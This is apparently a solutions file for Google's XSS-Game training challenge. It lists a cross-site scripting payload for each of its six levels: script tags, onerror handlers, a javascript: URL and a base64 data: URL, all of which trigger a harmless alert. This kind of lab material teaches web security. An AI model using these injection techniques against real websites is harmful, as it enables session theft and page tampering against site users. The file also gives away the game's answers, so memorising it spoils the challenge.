# XSS-Game by Google

### Level 1
```
https://xss-game.appspot.com/level1/frame?query=<script>alert("HACKED")</script>
```

### Level 2
```
<img src="asdf" onerror='alert("HACKED")'/>
```

### Level 3
```
https://xss-game.appspot.com/level3/frame/#"/><img src='asdf' onerror='alert("HACKED")'/>
```

### Level 4
```
'**alert("HACKED"));//
?timer=%27**alert%28%22HACKED%22%29%29%3B%2F%2F
```

### Level 5
```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert()
```
### Level 6
```
base64(alert("HACKED");) => "YWxlcnQoIkhBQ0tFRCIpOw=="
https://xss-game.appspot.com/level6/frame#data:text/javascript;base64,YWxlcnQoIkhBQ0tFRCIpOw==
```
